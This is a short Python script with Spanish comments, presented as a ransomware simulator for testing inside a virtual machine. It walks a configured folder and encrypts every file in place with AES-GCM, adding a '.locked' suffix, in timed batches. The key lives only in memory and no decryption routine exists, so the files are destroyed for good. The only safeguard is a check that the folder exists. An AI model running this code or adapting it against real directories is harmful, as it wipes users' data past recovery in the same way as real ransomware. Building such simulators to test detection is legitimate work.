
import os
import time
import random
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# CONFIGURACION (modificar SOLO dentro de la VM para pruebas)
SANDBOX_DIR = Path(r"C:\ransom_sandbox")  # o "/home/user/ransom_sandbox"
ENC_INTERVAL = 5            # segundos entre cada 'lote' de cifrado
FILES_PER_CYCLE = 10        # cuantos archivos cifrar por ciclo
EXT = ".locked"             # sufijo para archivos cifrados

# Genera clave maestra para la sesión (solo demo)
MASTER_KEY = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(MASTER_KEY)


def list_candidate_files(base_dir):
    files = []
    for root, dirs, filenames in os.walk(base_dir):
        for f in filenames:
            full = Path(root) / f
            # evita cifrar ya cifrados por este simulador
            if not str(full).endswith(EXT):
                files.append(full)
    return files


def encrypt_file(path: Path):
    try:
        data = path.read_bytes()
        nonce = os.urandom(12)
        ct = aesgcm.encrypt(nonce, data, None)
        payload = nonce + ct
        path.write_bytes(payload)
        new_name = str(path) + EXT
        path.rename(new_name)
        return True
    except Exception as e:
        print(f"[ERROR cifrar] {path}: {e}")
        return False


def main():
    print("Simulador iniciado. SANDBOX_DIR =", SANDBOX_DIR)
    while True:
        candidates = list_candidate_files(SANDBOX_DIR)
        if not candidates:
            print("No quedan archivos para cifrar. Saliendo.")
            break
        # seleccionar una 'carpeta' al azar para simular comportamiento
        random.shuffle(candidates)
        to_encrypt = candidates[:FILES_PER_CYCLE]
        print(f"Cifrando {len(to_encrypt)} archivos...")
        for p in to_encrypt:
            encrypt_file(Path(p))
        time.sleep(ENC_INTERVAL)


if __name__ == "__main__":
    # seguridad: comprobar que SANDBOX_DIR existe y parece ser sandbox
    if not SANDBOX_DIR.exists():
        print("SANDBOX_DIR no existe. Crea la carpeta de pruebas y vuelve a ejecutar.")
    else:
        main()
